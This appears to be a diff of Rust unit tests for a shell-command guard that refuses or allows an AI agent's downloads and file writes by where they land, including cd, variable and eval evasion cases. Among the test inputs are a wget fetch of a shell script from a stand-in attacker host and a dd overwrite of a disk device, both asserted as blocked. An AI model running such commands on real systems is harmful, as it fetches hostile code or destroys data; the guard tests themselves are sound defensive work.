@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: Apache-2.0
 //! Unit tests for the ctx_shell guard, compression and auth-flow detection.
 //!
 //! Split out of `ctx_shell.rs` (#1768 grew it past the 1500-line LOC gate).
@@ -241,10 +242,17 @@ fn validate_allows_curl_to_stdout() {
 }
 
 #[test]
-fn validate_blocks_wget_default_file_download() {
+fn validate_judges_wget_by_where_it_writes() {
+    // No cwd: the default target (the current directory) cannot be placed.
     assert!(validate_command("wget http://attacker.com/shell.sh").is_some());
     assert!(validate_command("wget -q https://example.com/file.tar.gz").is_some());
-    assert!(validate_command("wget -O /tmp/out https://example.com").is_some());
+    assert!(validate_command("wget -O /etc/out https://example.com").is_some());
+    assert!(validate_command("wget -P /etc https://example.com/a").is_some());
+    assert!(validate_command("wget -qO- -o /etc/log https://example.com").is_some());
+    // A scratch destination passes, like `>` capture there.
+    assert!(validate_command("wget -O /tmp/out https://example.com").is_none());
+    assert!(validate_command("wget -qO/tmp/out https://example.com").is_none());
+    assert!(validate_command("wget --directory-prefix=/tmp/d https://e.com/a").is_none());
 }
 
 #[test]
@@ -258,8 +266,9 @@ fn validate_allows_wget_stdout_and_spider() {
 
 #[test]
 fn validate_blocks_dd_output_file() {
-    assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_some());
+    assert!(validate_command("dd if=/dev/zero of=/tmp/fill bs=1M count=10").is_none());
     assert!(validate_command("dd if=image.iso of=/dev/sda").is_some());
+    assert!(validate_command("dd if=/dev/zero of=/etc/fill").is_some());
 }
 
 #[test]
@@ -678,10 +687,17 @@ fn a_relative_download_into_a_scratch_directory_is_allowed() {
     }
 }
 
-/// The #391 boundary is untouched: a relative target outside a scratch
-/// directory — or one this cannot resolve — is still a file write.
+/// Without capture roots only scratch passes: a relative target outside it —
+/// or one this cannot resolve — is still refused. wget and dd follow the same
+/// rule as curl.
 #[test]
-fn a_download_into_the_project_is_still_blocked() {
+fn a_download_outside_every_capture_root_is_blocked() {
+    for cmd in [
+        "cd /tmp && wget -O page.html https://e/x",
+        "cd /tmp && dd if=/dev/zero of=block.bin bs=1 count=1",
+    ] {
+        assert!(download_to_file_reason(cmd).is_none(), "{cmd}");
+    }
     for cmd in [
         "curl -sL -o shot.png https://example.com/a.png",
         "cd /Users/me/project && curl -sL -o shot.png https://e/x",
@@ -689,14 +705,126 @@ fn a_download_into_the_project_is_still_blocked() {
         "cd /tmp && curl -sL -o /Users/me/project/shot.png https://e/x",
         "wget https://example.com/a.tar.gz",
         "dd if=/dev/zero of=/Users/me/project/block.bin",
-        // wget/dd keep no scratch carve-out at all — a documented,
-        // separately tested decision this fix deliberately leaves alone.
-        "cd /tmp && wget -O page.html https://e/x",
-        "cd /tmp && dd if=/dev/zero of=block.bin bs=1 count=1",
     ] {
         assert!(
             download_to_file_reason(cmd).is_some(),
             "must stay blocked: {cmd}"
+        );
+    }
+}
+
+/// #1953: the refusal recommends an absolute scratch path, so the same path
+/// spelled through a variable the command itself set must pass too. A
+/// variable this cannot follow still leaves the target refused.
+#[test]
+fn a_download_target_through_a_literal_variable_is_judged_where_it_lands() {
+    for cmd in [
+        // The reporter's form.
+        "D=/private/tmp/claude-502/s/scratchpad/vp; curl -fsSL https://e/x -o $D/install.sh; wc -l $D/install.sh",
+        "D=/tmp/x && curl -sL -o ${D}/shot.png https://e/x",
+        "export D=\"/tmp/with space\"; curl -sL -o \"$D/shot.png\" https://e/x",
+    ] {
+        assert!(
+            download_to_file_reason(cmd).is_none(),
+            "a literal scratch variable must resolve: {cmd}"
+        );
+    }
+    for cmd in [
+        // Assigned to a project path: resolved, and refused on the destination.
+        "D=/Users/me/project; curl -sL -o $D/shot.png https://e/x",
+        // Never assigned, or assigned where it may not take effect.
+        "curl -sL -o $D/shot.png https://e/x",
+        "true && D=/tmp; curl -sL -o $D/shot.png https://e/x",
+        "D=/tmp | curl -sL -o $D/shot.png https://e/x",
+        // Not a literal, or rebound after the assignment.
+        "D=$(mktemp -d); curl -sL -o $D/shot.png https://e/x",
+        "D=/tmp; read D; curl -sL -o $D/shot.png https://e/x",
+        // A variable glued to more name characters is a different variable.
+        "D=/tmp; curl -sL -o $Dx/shot.png https://e/x",
+    ] {
+        assert!(
+            download_to_file_reason(cmd).is_some(),
+            "must stay refused: {cmd}"
+        );
+    }
+    let msg = validate_command("curl -sL -o $UNSET/shot.png https://e/x").expect("blocked");
+    assert!(
+        msg.contains("a variable this same command set to a literal path"),
+        "the refusal must say which spellings it can resolve: {msg}"
+    );
+}
+
+/// #2080 follow-up (owner decision 2026-10-15): a download may write where
+/// `>` capture may. An agent fetching a model into its project was refused
+/// three times in a row — variable, literal, `&&` chain — before giving up;
+/// scratch-then-`mv` was the only route. The reporter's forms now pass.
+#[test]
+fn a_download_writes_where_output_capture_may() {
+    // An absolute root on every platform: `/Users/…` is not absolute on Windows.
+    let home = if cfg!(windows) {
+        "C:/Users/me"
+    } else {
+        "/Users/me"
+    };
+    let project = format!("{home}/promo/tts");
+    let other = format!("{home}/other");
+    let roots = vec![project.clone()];
+    let check = |cmd: &str, cwd: Option<&str>| validate_command_in_cwd(cmd, &roots, None, cwd);
+    for (cmd, cwd) in [
+        (
+            format!("D={project}; B=https://h/x; curl -sL -o $D/model/m.onnx $B/m.onnx"),
+            None,
+        ),
+        (
+            format!("curl -sL -o {project}/model/v.npz https://h/v.npz"),
+            None,
+        ),
+        (
+            "curl -sL -o model/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "cd model && curl -sLO https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "wget -P model https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "dd if=/dev/zero of=model/blank.bin bs=1 count=1".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o /tmp/shot.png https://e/x".to_string(),
+            Some(project.as_str()),
+        ),
+    ] {
+        assert!(check(&cmd, cwd).is_none(), "{cmd}: {:?}", check(&cmd, cwd));
+    }
+    for (cmd, cwd) in [
+        (
+            format!("curl -sL -o {other}/m.onnx https://h/m.onnx"),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o ../../other/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o $UNSET/m.onnx https://h/m.onnx".to_string(),
+            Some(project.as_str()),
+        ),
+        (
+            "curl -sL -o model/m.onnx https://h/m.onnx".to_string(),
+            None,
+        ),
+        ("wget https://h/m.onnx".to_string(), Some(other.as_str())),
+    ] {
+        let msg = check(&cmd, cwd).unwrap_or_else(|| panic!("must stay refused: {cmd}"));
+        assert!(
+            msg.contains("may write where output capture may") && msg.contains("project"),
+            "the refusal states the rule it applies: {msg}"
         );
     }
 }
@@ -831,22 +959,494 @@ fn redirect_refusal_names_the_destination_not_a_size() {
     );
 }
 
+/// #1992: the child shell performs the redirect, so a captured file receives
+/// the command's own bytes — compression only touches the MCP return channel
+/// (#1303, v3.9.14). No write refusal may justify itself with compression
+/// markers any more; each states the write-path reason and that the verdict
+/// does not depend on the output.
+#[test]
+fn write_refusals_state_the_write_path_reason_not_compression() {
+    let allow = vec!["/tmp".to_string()];
+    let commands = [
+        "cat > /project/util/zz_test.go <<'EOF'\npackage util\nEOF",
+        "printf 'x\n' > /project/out.txt",
+        "seq 1 5 | tee /project/out.txt",
+        "curl -sL -o /project/shot.png https://example.com/x.png",
+    ];
+    for command in commands {
+        let message = validate_command_with_write_allow_paths(command, &allow, Some("/project"))
+            .unwrap_or_else(|| panic!("a project write is refused: {command}"));
+        for stale in [
+            "compression markers",
+            "compresses what it returns",
+            "compressed output",
+            "may not be the bytes",
+        ] {
+            assert!(
+                !message.contains(stale),
+                "stale compression rationale `{stale}` in refusal for {command}: {message}"
+            );
+        }
+        if !command.starts_with("curl") {
+            assert!(
+                message.contains("ctx_patch") && message.contains("read-before-write"),
+                "the refusal must name the real write path for {command}: {message}"
+            );
+        }
+    }
+}
+
+/// #1946: a destination outside the project — and outside every root — is
+/// refused like a project path, so the refusal must not call the rule
+/// "into a project path". The reporter believed that wording, tried another
+/// non-project path and hit the identical refusal. Both the redirect and the
+/// `tee` refusal state the rule that fires and name the configured escape.
+/// Owner decision 2026-10-08 (Discord report: "refuses the project dir and
+/// ignores allow_paths"): ctx_shell capture may land in the session's project
+/// and the jail's allow entries; every other destination stays refused, and
+/// broad roots never become capture roots.
+#[test]
+fn capture_into_the_project_and_allow_entries_is_allowed() {
+    let _iso = crate::core::data_dir::isolated_data_dir();
+    let project = tempfile::tempdir().unwrap();
+    let shared = tempfile::tempdir().unwrap();
+    let cfg = crate::core::config::Config {
+        allow_paths: vec![shared.path().to_string_lossy().into_owned()],
+        ..Default::default()
+    };
+    let project_s = project.path().to_string_lossy().into_owned();
+    let mut allow = vec!["/tmp".to_string()];
+    allow.extend(super::capture_roots(&project_s, &[], &cfg));
+
+    // Shell text uses `/` (a `\` is an escape to the POSIX tokenizer); Windows
+    // accepts it, and that is how agents spell paths in commands there.
+    let shell = |p: &std::path::Path| p.to_string_lossy().replace('\\', "/");
+    let (proj, shared_s) = (shell(project.path()), shell(shared.path()));
+    for cmd in [
+        format!("cargo build 2>&1 > {proj}/build.log"),
+        format!("echo x | tee {proj}/out.txt"),
+        format!("echo x >> {shared_s}/notes.txt"),
+    ] {
+        assert!(
+            validate_command_in_cwd(&cmd, &allow, None, Some(&project_s)).is_none(),
+            "{cmd}"
+        );
+    }
+    // A relative target from the project cwd lands in the project.
+    assert!(validate_command_in_cwd("echo x > out.txt", &allow, None, Some(&project_s)).is_none());
+    // Elsewhere stays refused.
+    assert!(
+        validate_command_in_cwd(
+            "echo x > /Users/me/Desktop/p.txt",
+            &allow,
+            None,
+            Some(&project_s)
+        )
+        .is_some()
+    );
+    // `/`, `~` and its ancestors never become capture roots.
+    let home = dirs::home_dir().unwrap().to_string_lossy().into_owned();
+    let broad = crate::core::config::Config {
+        allow_paths: vec!["/".into(), "~".into(), home.clone()],
+        ..Default::default()
+    };
+    {
+        let found = &super::capture_roots(&home, &["/".to_string()], &broad);
+        assert!(found.is_empty(), "{found:?}");
+    }
+}
+
+#[test]
+fn capture_refusals_state_the_rule_that_fires_outside_the_project() {
+    let allow = vec!["/tmp".to_string()];
+    for cmd in [
+        "echo probe > /Users/me/Desktop/probe.txt",
+        "echo probe | tee /Users/me/Desktop/probe.txt",
+    ] {
+        let msg = validate_command_with_write_allow_paths(cmd, &allow, Some("/Users/me/project"))
+            .expect("a non-scratch destination outside the project is refused");
+        assert!(
+            !msg.contains("into a project path")
+                && !msg.contains("the destination is inside the project"),
+            "the rule must not be scoped to the project: {msg}"
+        );
+        assert!(
+            msg.contains("write_allow_paths") && msg.contains("/tmp"),
+            "name the scratch paths and the configured escape: {msg}"
+        );
+        assert!(
+            msg.contains("/Users/me/Desktop/probe.txt"),
+            "name the destination: {msg}"
+        );
+    }
+}
+
 /// The target is reported verbatim, so a caller can match it against the
 /// command they sent — including the `>>` form and a non-final segment.
 #[test]
 fn disallowed_redirect_target_is_reported_verbatim() {
     assert_eq!(
-        disallowed_write_redirect_target("echo hi > out.txt", &[], None).as_deref(),
+        disallowed_write_redirect_target("echo hi > out.txt", &[], None, None).as_deref(),
         Some("out.txt")
     );
     assert_eq!(
-        disallowed_write_redirect_target("echo a; echo hi >> logs/run.log; echo b", &[], None)
-            .as_deref(),
+        disallowed_write_redirect_target(
+            "echo a; echo hi >> logs/run.log; echo b",
+            &[],
+            None,
+            None
+        )
+        .as_deref(),
         Some("logs/run.log")
     );
     assert_eq!(
-        disallowed_write_redirect_target("echo x >&1", &[], None),
+        disallowed_write_redirect_target("echo x >&1", &[], None, None),
         None,
         "fd duplication names no file"
+    );
+}
+
+// --- #1811: the destination decides, so a relative target gets placed first ---
+
+/// The reported case: a relative target under a scratch `cwd` was blocked while
+/// the identical absolute path was allowed, and the refusal claimed "the
+/// destination decides" about a destination it had never resolved.
+#[test]
+fn relative_target_under_scratch_cwd_is_allowed() {
+    let paths = vec!["/private/tmp".to_string()];
+    assert!(
+        validate_command_in_cwd(
+            "echo x > probe.txt",
+            &paths,
+            Some("/repo"),
+            Some("/private/tmp/scratch"),
+        )
+        .is_none(),
+        "a relative target resolving into a scratch path must be allowed"
+    );
+}
+
+/// The direction that matters more: resolving must not become a loophole. A
+/// relative target under a *project* cwd now resolves into the project and is
+/// refused on the same rule as an absolute one.
+#[test]
+fn relative_target_under_project_cwd_stays_blocked() {
+    let paths = vec!["/private/tmp".to_string()];
+    for command in [
+        "echo x > probe.txt",
+        "echo x >> logs/run.log",
+        "echo x | tee probe.txt",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo/sub"),).is_some(),
+            "{command}: a relative target inside the project must stay blocked"
+        );
+    }
+}
+
+/// `..` must not walk out and back in unnoticed: the comparison resolves the
+/// joined path, so traversal landing inside the project is still refused.
+#[test]
+fn relative_traversal_back_into_the_project_stays_blocked() {
+    let paths = vec!["/private/tmp".to_string()];
+    assert!(
+        validate_command_in_cwd(
+            "echo x > ../src/main.rs",
+            &paths,
+            Some("/repo"),
+            Some("/repo/sub"),
+        )
+        .is_some(),
+        "traversal that lands back inside the project must stay blocked"
+    );
+}
+
+/// Without a cwd nothing changes: a relative target cannot be placed, so it
+/// keeps the pre-existing conservative refusal.
+#[test]
+fn relative_target_without_cwd_keeps_the_old_refusal() {
+    let paths = vec!["/private/tmp".to_string()];
+    assert!(validate_command_in_cwd("echo x > probe.txt", &paths, Some("/repo"), None).is_some());
+}
+
+/// A cwd outside both the project and the allow-list is not a licence to write
+/// there — the allow-list decides, the cwd only places the target.
+#[test]
+fn relative_target_under_unlisted_cwd_stays_blocked() {
+    let paths = vec!["/private/tmp".to_string()];
+    assert!(
+        validate_command_in_cwd(
+            "echo x > probe.txt",
+            &paths,
+            Some("/repo"),
+            Some("/somewhere/else"),
+        )
+        .is_some(),
+        "cwd places the target; it does not allow-list it"
+    );
+}
+
+/// #1850, the false block: the call runs in the project, but `cd` moves the
+/// redirect into scratch. Judged against the call's cwd, `out.txt` looked like
+/// a project write.
+#[test]
+fn a_cd_into_scratch_places_a_relative_target_in_scratch() {
+    let paths = vec!["/private/tmp".to_string()];
+    for command in [
+        "cd /private/tmp/work && echo x > out.txt",
+        "cd /private/tmp/work && go test ./... | tee run.log",
+        "cd /private/tmp && cd work && echo x >> out.txt",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo")).is_none(),
+            "{command}: the target lands in scratch and must be allowed"
+        );
+    }
+}
+
+/// #1850, the direction that matters more: from a scratch cwd, `cd` into the
+/// project must not smuggle a relative target past the guard.
+#[test]
+fn a_cd_into_the_project_keeps_a_relative_target_blocked() {
+    let paths = vec!["/private/tmp".to_string()];
+    for command in [
+        "cd /repo && echo hi > f",
+        "cd /repo/src && echo hi >> lib.rs",
+        "cd /repo && echo hi | tee f",
+        "cd ../../../repo && echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/private/tmp/s"))
+                .is_some(),
+            "{command}: the target lands in the project and must be refused"
+        );
+    }
+}
+
+/// Wherever the directory is not certain, a relative target is refused — even
+/// though every one of these starts from a scratch cwd, because each can end up
+/// running in the project.
+#[test]
+fn a_relative_target_after_an_uncertain_cd_is_refused() {
+    let paths = vec!["/private/tmp".to_string()];
+    for command in [
+        // May not have run, or may have failed and fallen through.
+        "true || cd /private/tmp/x && echo hi > f",
+        "cd /private/tmp/missing && true; echo hi > f",
+        "cd /private/tmp/missing && true || echo hi > f",
+        "cd /private/tmp/missing || echo failed; echo hi > f",
+        "false && cd /private/tmp/x; echo hi > f",
+        // Moves the shell in a way the text does not spell out.
+        "pushd /repo && echo hi > f",
+        "builtin cd /repo && echo hi > f",
+        "{ cd /repo; } && echo hi > f",
+        "for d in a; do cd /repo; done; echo hi > f",
+        "cd \"$PROJECT\" && echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/private/tmp/s"))
+                .is_some(),
+            "{command}: the directory is not certain, so a relative target must be refused"
+        );
+    }
+}
+
+/// A `cd` in a background job or a subshell moves nothing after it, so the
+/// target stays where the call runs — in the project here.
+#[test]
+fn a_cd_that_cannot_move_the_shell_does_not_move_the_target() {
+    let paths = vec!["/private/tmp".to_string()];
+    for command in [
+        "cd /private/tmp/x && true & echo hi > f",
+        "(cd /private/tmp/x && make) && echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo")).is_some(),
+            "{command}: the target still lands in the project"
+        );
+    }
+}
+
+/// `cd x || exit` is how scripts make a `cd` certain; what follows runs in `x`.
+#[test]
+fn cd_or_exit_makes_the_directory_certain() {
+    let paths = vec!["/private/tmp".to_string()];
+    assert!(
+        validate_command_in_cwd(
+            "cd /private/tmp/work || exit 1; echo x > out.txt",
+            &paths,
+            Some("/repo"),
+            Some("/repo"),
+        )
+        .is_none()
+    );
+}
+
+/// `cd <dir>; …` runs the next command either way, so it only moves the target
+/// when the directory exists and the `cd` cannot fail.
+#[test]
+#[cfg(unix)]
+fn cd_then_semicolon_follows_an_existing_directory_only() {
+    let scratch = tempfile::tempdir().expect("tempdir");
+    let dir = scratch.path().to_string_lossy().into_owned();
+    let paths = vec![dir.clone()];
+    assert!(
+        validate_command_in_cwd(
+            &format!("cd {dir}; echo x > out.txt"),
+            &paths,
+            Some("/repo"),
+            Some("/repo"),
+        )
+        .is_none(),
+        "an existing directory: the `cd` takes effect"
+    );
+    assert!(
+        validate_command_in_cwd(
+            &format!("cd {dir}/missing; echo x > out.txt"),
+            &paths,
+            Some("/repo"),
+            Some("/repo"),
+        )
+        .is_some(),
+        "a missing directory: the `cd` fails and the write lands in the project"
+    );
+}
+
+/// A refused relative target says how it was placed, so the caller knows to
+/// give an absolute path; an absolute one does not need the explanation.
+#[test]
+fn a_refused_relative_target_explains_where_it_was_placed() {
+    let paths = vec!["/private/tmp".to_string()];
+    let relative = validate_command_in_cwd("pushd /x && echo hi > f", &paths, Some("/repo"), None)
+        .expect("refused");
+    assert!(relative.contains("its own command runs in"), "{relative}");
+    assert!(relative.contains("absolute path"), "{relative}");
+    let absolute =
+        validate_command_in_cwd("echo hi > /repo/f", &paths, Some("/repo"), Some("/repo"))
+            .expect("refused");
+    assert!(!absolute.contains("its own command runs in"), "{absolute}");
+}
+
+/// #2081: quoted text is data. The reporter appended a log line that mentioned
+/// `cd $TMPDIR`; the word `cd` inside the string made the directory "unknown"
+/// and the relative target was refused.
+#[test]
+fn a_cd_inside_a_quoted_argument_does_not_unplace_a_relative_target() {
+    let scratch = vec!["/private/tmp".to_string()];
+    for command in [
+        "printf '%s\\n' 'note: cd /repo mention' > f.txt",
+        "printf '%s\\n' 'note: cd $TMPDIR mention' > f.txt",
+        "echo \"then pushd /repo\" >> f.txt",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &scratch, Some("/repo"), Some("/private/tmp/s"))
+                .is_none(),
+            "{command}: the target lands in the call's scratch cwd"
+        );
+    }
+    // The reporter's form, with the project as a capture root.
+    let roots = vec!["/private/tmp".to_string(), "/repo".to_string()];
+    let command = "cd /repo && printf '| %s | (cd $TMPDIR not followed by capture guards) |\\n' \
+                   \"$(date +%H:%M)\" >> .wolf/memory.md && tail -1 .wolf/memory.md";
+    assert!(
+        validate_command_in_cwd(command, &roots, None, Some("/repo")).is_none(),
+        "{command}"
+    );
+}
+
+/// The other side of #2081: a quoted command name still runs, and `eval` runs
+/// text in this shell. From a scratch cwd these can move into the project, so
+/// a relative target after them stays refused.
+#[test]
+fn a_quoted_cd_command_or_eval_keeps_a_relative_target_refused() {
+    let scratch = vec!["/private/tmp".to_string()];
+    for command in [
+        "\"cd\" /repo && echo hi > f",
+        "c'd' /repo && echo hi > f",
+        "\\cd /repo && echo hi > f",
+        "eval 'cd /repo' && echo hi > f",
+        "eval \"cd /repo\"; echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &scratch, Some("/repo"), Some("/private/tmp/s"))
+                .is_some(),
+            "{command}: the directory is not certain, so a relative target must be refused"
+        );
+    }
+}
+
+/// #2079: `cd $TMPDIR/<dir>` and `cd $D` with `D` set to a literal earlier are
+/// followed like the literal, for both capture guards.
+#[test]
+fn a_cd_through_a_known_variable_places_a_relative_target() {
+    let scratch = vec!["/private/tmp".to_string()];
+    for command in [
+        "D=/private/tmp/w; cd $D && echo hi > e.txt",
+        "D=/private/tmp; cd \"$D/w\" && echo hi | tee e.txt",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &scratch, Some("/repo"), Some("/repo")).is_none(),
+            "{command}: the target lands in scratch"
+        );
+    }
+    for command in [
+        "D=/tmp/w; cd $D && curl -s -o b.txt https://example.com",
+        "D=/tmp; cd ${D}/w && curl -s -o b.txt https://example.com",
+    ] {
+        assert!(download_to_file_reason(command).is_none(), "{command}");
+    }
+    // Resolved, and refused on where it lands.
+    for command in [
+        "D=/repo; cd $D && echo hi > f",
+        "TMPDIR=/repo; cd $TMPDIR && echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &scratch, Some("/repo"), Some("/private/tmp/s"))
+                .is_some(),
+            "{command}: the target lands in the project"
+        );
+    }
+    // Not resolvable: rebound to something unknown, or never set.
+    for command in [
+        "TMPDIR=$PWD; cd $TMPDIR && echo hi > f",
+        "cd $PROJECT && echo hi > f",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &scratch, Some("/repo"), Some("/private/tmp/s"))
+                .is_some(),
+            "{command}: the directory is not certain"
+        );
+    }
+    for command in [
+        "TMPDIR=$PWD; cd $TMPDIR && curl -s -o b.txt https://e/x",
+        // Was judged against the environment's `$TMPDIR` and let through.
+        "TMPDIR=$PWD; curl -s -o $TMPDIR/b.txt https://e/x",
+        "export TMPDIR=$(pwd); curl -s -o $TMPDIR/b.txt https://e/x",
+    ] {
+        assert!(download_to_file_reason(command).is_some(), "{command}");
+    }
+
+    // The reporter's exact forms, wherever this machine's `$TMPDIR` is.
+    let Some(tmpdir) = std::env::var("TMPDIR")
+        .ok()
+        .filter(|t| !t.is_empty() && std::path::Path::new(t).is_dir())
+    else {
+        return;
+    };
+    let paths = vec![tmpdir];
+    for command in [
+        "cd $TMPDIR && echo hi > lcx-probe-i.txt",
+        "cd $TMPDIR/lcx-probe && echo hi > e.txt",
+    ] {
+        assert!(
+            validate_command_in_cwd(command, &paths, Some("/repo"), Some("/repo")).is_none(),
+            "{command}"
+        );
+    }
+    assert!(
+        download_to_file_reason(
+            "cd $TMPDIR/lcx-probe && curl -s -m 10 -o b.txt https://example.com"
+        )
+        .is_none()
     );
 }
